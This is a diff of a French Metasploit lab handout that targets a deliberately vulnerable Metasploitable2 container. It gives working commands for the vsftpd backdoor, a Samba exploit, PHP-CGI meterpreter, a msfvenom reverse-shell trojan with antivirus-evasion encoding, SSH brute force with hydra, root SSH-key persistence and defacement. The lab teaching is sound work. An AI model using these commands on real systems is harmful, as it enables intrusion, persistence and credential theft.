@@ -4,10 +4,16 @@ TODO avant de lancer le TP :
 
 o Instancier une VM snap-docker-ready
 o docker pull tleemcjr/metasploitable2
-o docker run --name metasploitable2 -it tleemcjr/metasploitable2:latest sh -c "/bin/services.sh && bash"
+o docker run --name metasploitable2 -it \
+
+-p 21:21 -p 6200:6200 -p 80:80 -p 2222:22 -p 5900:5900 -p 139:139
+
+tleemcjr/metasploitable2:latest sh -c "/bin/services.sh && bash"
+
 --
 o ouvrir les ports :
 	21,6200
+	139
 	80,4444
 	
 
@@ -25,7 +31,31 @@ o ouvrir les ports :
 
 **Objectif :** Découvrir et prendre en main les fonctionnalités de base du framework Metasploit.
 
-![Metasploit](img/metasploit.png)
+<!-- ![Metasploit](img/metasploit.png) -->
+```text
+                                   .,,.                  .
+                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
+                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
+                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
+  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
+  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
+ d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
+d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
+                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
+                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
+                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
+                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
+              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
+           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
+_______________________________________________________________   ,&$$$$$$'_____
+                                                                 ll&&$$$$'
+                                                              .;;lll&&&&'
+                                                            ...;;lllll&'
+                                                          ......;;;llll;;;....
+                                                           ` ......;;;;... .  .
+```
+
+
 
 Metasploit est un framework qui aide à trouver et à exploiter des vulnérabilités.
 
@@ -87,14 +117,14 @@ msf exploit(linux/http/librenms_collectd_cmd_inject) > options
 ...
 msf exploit(linux/http/librenms_collectd_cmd_inject) > set RHOSTS 192.168.1.254
 ```
-Vous devrez définir toutes les variables requises avant de pouvoir exécuter l'exploit.
+Vous devrez définir toutes les variables requises (*Required: yes*) avant de pouvoir exécuter l'exploit.
 Une fois vos *settings* terminé vous pouvez saisir à nouveau la commande `options` pour vérifier la bonne prise en compte de vos paramètres.
 
 Dans Metasploit, `LHOST`, `RHOST` et `SRVHOST` sont parmi les noms de variables les plus couramment utilisés. 
 
   - `LHOST` fait référence à l'adresse IP de votre machine, qui est généralement utilisée pour créer une connexion inverse à votre machine une fois l'attaque réussie. 
   - `RHOST` fait référence à l'adresse IP de l'hôte cible. 
-  - `SRVHOST` est l'adresse à laquelle le module se connectera pour télécharger des *payloads* supplémentaires.
+  - `SRVHOST` est l'adresse à laquelle le module se connectera pour télécharger des *payloads* supplémentaires (non utilisé dans ce TP).
 
 Enfin, une fois la configuration terminée, vous pouvez lancer la commande `exploit` pour lancer l'exploit !
 
@@ -170,7 +200,7 @@ Comment obtenir plus d'information sur cet exploit dans la console msf ?
   
 ```
 
-Notez dans la section _Basic options_ quelle(s) variable(s) devez vous configurer ?
+Notez dans la section _Basic options_ quelles sont les variables que vous devrez configurer ?
 
 <!--  RHOST -->
 
@@ -178,7 +208,7 @@ Notez dans la section _Basic options_ quelle(s) variable(s) devez vous configure
   
 ```
 
-Selectionnez l'exploit avec la commande `use`.
+Sélectionnez l'exploit avec la commande `use`.
 
 <!-- use exploit/unix/ftp/vsftpd_234_backdoor -->
 
@@ -194,9 +224,9 @@ Quel est le nouvel invite de la ligne de commande ?
   
 ```
 
-Initialisez `RHOST` avec `set` puis lancez l'exploit.
+Initialisez `RHOSTS` avec `set` puis lancez l'exploit.
 
-<!-- set RHOST @IPtarget ; exploit -->
+<!-- set RHOSTS @IPtarget ; exploit -->
 
 ```text
   
@@ -238,39 +268,93 @@ Profitez-en également pour vous assurez un retour facile sur cette machine comp
 
 ```
 
+**Lien :** Plus d'informations sur cet exploit ([lien](https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec18/vulnerability-analysis-of-vsftpd-2-3-4-backdoor)) et aller au-delà...
+
+
 ---
 
-### Exploit 2 : Exploitation d'un service mal configuré (NFS)
+### Exploit 2 : Exploitation d'un service Samba
 
-Le résultat du scan précédent laisse apparaitre l'exposition d'un service NFS.
-Avec la commande `showmount` sur la machine attaquante déterminez quelle partie de l'arborescence est exposé ?
-<!-- showmount -e @IPcible -->
+Le résultat du scan précédent laisse apparaitre l'exposition d'un service Samba (sur les ports 139 et 445) qui est la version libre du système de partage de fichier de Windows. 
+
+Réalisez un scan qui vous permettra d'obtenir la version de Samba (module `smb_version` des outils auxiliaire de Metasploit)
+
 ```text
-  showmount -... ____.____.____.____
+use ...
+show options
+set ...
+run
 ```
-Quelle répertoire est *montable* ? Qui peut y accéder ?
+
+Notez la version de Samba retournée par l'exécution du module ci-dessus (`smb_version`).
+<!-- 3.0.20 -->
+```text
+
+_____ . _____ . _____
+
+```
+
+
+
+Recherchez avec l'outil `searchsploit` (disponible sur Kali) si il existe un exploit relatif à cette version de Samba.
+
+```text
+searchsploit samba | grep _____ . _____ . _____
+
+```
+
+A présent, dans la console recherchez un exploit qui correspondrait aux mots clé retourné par *searchsploit*.
+
+<!-- grep samba search username map script-->
+
+```text
+
+
+```
+
+Une fois trouvé, utilisez l'exploit 
+
 <!-- 
-Le répertoire moutable est la racine (/) !!!
-Toutes les adresses IP y ont accès (*) !!! 
+	use exploit/multi/samba/username_map_script 
 -->
+
 ```text
-  
+use ...
+show options
+set ...
+run
+ 
 ```
 
-Pour vous assurez de la possibilité d'exploiter cette faille de configuration du service NFS, créez vous un point de montage et montez ce répetoire distant sur votre poste.
-<!-- mkdir racine ; mount [-o nolock] -t nfs @IPcible:/ ./racine -->
-```text
 
+Cela devrait avoir pour effet de lancer un shell (minimaliste). Faite alors Ctrl-Z ou saisissez la commande `background`. Cela aura pour effet de vous proposer de mettre la session en background. Vous pouvez listez toutes les sessions en background avec la commande `sessions` et vous reconnectez à une session avec la commande `sessions suivi du numéro de session. Essayez.
+
+```text
+background
+y (pour yes)
+sessions -l
+sessions -i 1
 ```
 
-Profitez-en pour vous assurez un retour facile sur cette machine compromise en vous créant un accès plus discret en ajoutant votre clé publique ssh au fichier *authorized_keys* de root.  
-  <!-- 
-ssh_keygen
-cat id_rsa >> ./racine/root/.ssh/authorized_keys
-umount racine
-ssh -i id_rsa root@_IP cible_
-  -->
+Enfin profitez-en pour vous assurez un retour facile sur cette machine
+compromise en vous créant par exemple un accès plus discret en ajoutant votre clé publique
+ssh au fichier *authorized_keys* du compte root.
+
+<!-- 
+ ssh_keygen (sur la Kali)
+
+ (sur la cible)
+ echo "copiercollerclepublique" >> /root/.ssh/authorized_keys
+ 
+ (sur la kali)
+ ssh -i id_rsa root@_IP cible_
+-->
+
 ```text
+
+
+
+
 
 ```
 
@@ -278,17 +362,22 @@ ssh -i id_rsa root@_IP cible_
 
 ### Exploit 3 : Service Web vulnerable (php + meterpreter)
 
-Essayez de déterminer quelle version de php est utilisé sur la machine cible.
+<!-- Verifier le bon demarrage de Apache2 -- service apache2 start -->
+
+Essayont d'abord de déterminer quelle version de PHP est utilisé sur la machine cible.
 L'outil `dirbuster` ou `dirb` permet de découvrir la présence d'un fichier `phpinfo.php`. 
-Appelez le avec votre navigateur. Quelle version est utilisé ?
+
+<!--dirb http://192.168.239.xxx -->
+
+Appelez le ensuite avec votre navigateur. Quelle version est utilisé ?
 <!-- 5.2.4 -->
 ```text
     ___ . ___ . ___
 ```
 Cette version PHP est connue pour être vulnerable à *PHPCGI Argument Injection*.
 
-Quelles sont les arguments a passer à la commande `search` pour retrouver le nom exact de ce module sachant 
-qu'il date de 2012 (cve:2012) et qu'il est classé comme excellent (rank: excellent).
+Quelles sont les arguments à passer à la commande `search` pour retrouver le nom exact de ce module sachant 
+qu'il date de 2012 (*cve:2012*) et qu'il est classé comme excellent (*rank: excellent*).
 
 <!-- search cve:2012 rank:excellent php cgi argument injection -->
 
@@ -315,21 +404,33 @@ meterpreter > shell
 
 **Astuce :** Utilisez le payload `php/meterpreter/reverse_php`. 
 
+Une fois l'exploit lancé (avec la commande `run` ou `exploit`) 
+vous devriez vous retrouver
+dans un shell *meterpreter*. Tapez les commandes `help`, `sysinfo`, `getuid`, 
+`shell`,...
+ 
+
+
+
 Notez que deux *payload* sont fondamentaux.
 
   - `...bind_tcp` : connection direct de la machine attaquante vers la machine cible.
   - `...reverse_tcp` : la machine cible exécute le payload et se connecte à la machine attaquante.
 
 #### Defacing 
-Modifiez la page web d'accueil (index.php) en y inscrivant un message de propagande amusant (Ex: Vive les pingoins !).
+Modifiez la page web d'accueil (index.php) en y inscrivant un message de propagande 
+amusant (Ex: Vive les pingoins !).
+
 <!-- sed -i -e 's/Warning/Hacked/g index.php -->
 
 ---
 
-### Exploit 4 : Injection (msfvenom)
+### Exploit 4 : Cheval de Troie (msfvenom)
 
-L'outil `msfvenom` est inclus dans le framework metasploit. Il est la fusion des anciens outils *msfpayload* et *msfencode*. 
-`msfvenom` nous servira à la création sur mesure de payload avec possibilité d'encodage (voir même multi-encodage) pour échapper aux antivirus par exemple.
+L'outil `msfvenom` est inclus dans le framework metasploit. Il est la fusion
+des anciens outils *msfpayload* et *msfencode*.  `msfvenom` nous servira à la
+création sur mesure de payload avec possibilité d'encodage (voir même
+multi-encodage) pour échapper aux antivirus par exemple.
 
 L'outil se lance dans un terminal. Sa documentation est accessible avec l'option `-h`.
 
@@ -339,28 +440,35 @@ msfvenom -h
 
 msfvenom propose un grand nombre de **payload** (`msfvenom --list payload`).
 
-**Astuce** : Pour connaitre les options requise a un payload, vous pouvez utiliser la msfconsole.
+**Astuce** : Pour connaitre les options requise a un payload, vous pouvez utiliser la *msfconsole*.
 
-Créez et spécifiez un payload (`-p linux/x86/meterpreter/reverse_tcp`) et son format (`-f elf`)
+Créez et spécifiez un payload (`-p linux/x86/meterpreter/reverse_tcp`) et son format (`-f elf`). Remarquez sa taille.
+
 <!-- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=@IPattaquant LPORT=4444 -f elf > runmeplz -->
+
 ```text
 msfvenom -p ....................... -f ... LHOST=____.____.____.____ LPORT=.... > runmeplz
 ```
 
-A présent, dans la msfconsole nous allons lancer le module d'écoute en le paramétrant avec les même paramétres que ceux utilisé pour générer notre payload ci-avant.
+A présent, dans la *msfconsole* nous allons lancer le module d'écoute en le paramétrant avec les mêmes
+ paramétres que ceux utilisés pour générer notre payload ci-avant.
 
 ```text
 use exploit/multi/handler 
 set payload linux/x86/meterpreter/reverse_tcp
 set LPORT 4444
-set LHOST @IPattaquant
+set LHOST ____.____.____.____ #IP attaquant (kali)
 show info
 exploit -j -z
 ```
+Nous voilà prêt à recevoir une connexion en provenance de la victime.
 
-Déployer et lancez le payload sur la machine cible (par le moyen de votre choix). 
-En vérité vous pousseriez la victime a lancer l'exécution de ce binaire sur son poste de travail.
+Déployez/Copiez et lancez le payload `runmeplz` sur la machine cible (par le moyen de votre choix). 
+En vérité vous pousseriez la victime à lancer l'exécution de ce binaire sur son poste de travail.
 
+<!-- scp -P 2222 runmeplz msfadmin@192.168.239.113: -->
+
+Connectez vous à la nouvelle session qui apparait dés que la victime a lancez votre cheval de Troie (Trojan).
 Une fois la console `meterpreter` démarrée vous pouvez commencer une nouvelle phase de post-exploitation.
 
 ```text
@@ -371,7 +479,7 @@ meterpreter> sysinfo
 
 #### A propos d'encodage (optionnel)
 
-L'objectif de ce type d'encodeur est de modifier le code du payload sans pour autant en modifier son fonctionnement.
+L'objectif de ce type d'un encodeur est de modifier le code du payload sans pour autant en modifier son fonctionnement.
 
 Vous pouvez vérifier l'efficacité de votre encodage sur [virustotal.com](http://virustotal.com) par exemple.
 
@@ -394,24 +502,28 @@ use auxiliary/scanner/smb/smb_enumusers
 set RHOSTS ___.___.___.___
 run
 ```
-Vous devriez obtenir une liste de nom d'utilisateurs (msfadmin, klog, sys, user, service).
+Vous devriez obtenir une liste de nom d'utilisateurs (msfadmin, klog, sys, user, service,...).
 
-En vous appuyant sur le dictionnaire *rockyou.txt* (disponible sur Kali dans /usr/share/wordlists/) par exemple et un outil comme *hydra*, *patator* ou *ncrack* 
-tentez de déterminer le mot de passe du compte *klog* sur le service ssh.
+En vous appuyant sur le dictionnaire *rockyou.txt* (disponible sur Kali dans
+/usr/share/wordlists/) par exemple et un outil comme *hydra* (ou *patator*, ou
+*ncrack*) tentez de déterminer le mot de passe du compte **klog** sur le service
+ssh (exceptionnellement sur le port 2222).
 
 <!-- 
-hydra -l klog -P ./rockyou.txt @_IP_cible ssh #(OK)
+hydra -l klog -P /usr/share/wordlists/rockyou.txt 192.168.239.113 -s 2222 ssh #(OK)
 
 patator ssh_login user=klog password=FILE0 0=./rockyou.txt host=@IPcible \
- -x ignore:mesg='Authentication failed.' #(OK)
+ -x ignore:mesg='Authentication failed.' #(KO car on ne peut pas spécifier le port 2222)
 
-ncrack -p22 --user klog -P ./rockyou.txt @IPcible #(KO)
---
+ncrack 192.168.239.113 -p ssh:2222 --user klog -P /usr/share/wordlists/rockyou.txt #(OK)
 -->
 
 ---
 
-### Exploit 6 : port 5900
+### Exploit 6 : VNC (port 5900)
+
+Un dernier exploit pour la route. Découvrez quel mot de passe est associé au compte *root* du survice VNC qui tourne sur la machine cible. Vous utiliserez pour cela le module `vnc_login`.
+
 
 ```text
 use auxiliary/scanner/vnc/vnc_login
@@ -420,18 +532,89 @@ set USERNAME root
 run
 ```
 
-Quel mot de passe est associé à ce username ?
+Quel mot de passe est associé à ce username (root) ?
 
 ```text
 Login successful : ___________
 ```
-Dans un terminal
+Validez ces *credentials* dans un terminal avec la commande vncviewer
 
 ```text
 vncviewer @IPcible
-```
 Mot de passe : ___________
+```
 
-
+<!-- ne pas oubliez l'option -X pour la connexion ssh à la Kali -->
 
 ---
+
+# Conclusion
+
+Dans ce TP nous n'avons vu que quelques fonctionnalités du framework Metasploit.
+C'est un outil puissant néanmoins tous les exploits peuvent être réalisé sans
+l'usage de Metasploit. Cela demande alors généralement un peu plus
+d'investissement de la part du pentesteur.
+Nous avons également vu (trop) rapidement l'interpreteur *Meterpreter*. C'est
+un outil qui peut s'averer redoutable notamment quand la cible est un poste
+Windows (prise de contrôle de la caméra, du micro et keylogging).  
+Enfin certaines attaques vu dans ce TP sont bien trop *bruyantes* pour être
+réaliste dans un réseau administré correctement néamoins nous avons  aussi vu
+des outils qui ne laisse pas ou peu de trace sur la machine victime.
+Enfin le dernier point non abordé dans ce TP est la notion de *pivoting* qui
+consiste a utiliser une première machine compromise pour attaquer d'autres
+machines initialement inaccessible.
+
+```text
+
+         .                                         .
+ .
+
+      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
+       '   dB'                     BBP
+    dB'dB'dB' dBBP     dBP     dBP BB
+   dB'dB'dB' dBP      dBP     dBP  BB
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB
+
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
+          .                  .                  dB' dBP    dB'.BP
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
+
+                                                                    .
+                .
+        o                  To boldly go where no
+                            shell has gone before
+
+
+```
+<!--
+nmap -sV 172.17.0.2
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2020-10-23 06:55 UTC
+Nmap scan report for 172.17.0.2
+Host is up (0.000093s latency).
+Not shown: 980 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login
+514/tcp  open  tcpwrapped
+1099/tcp open  rmiregistry GNU Classpath grmiregistry
+1524/tcp open  ingreslock?
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+-->
+
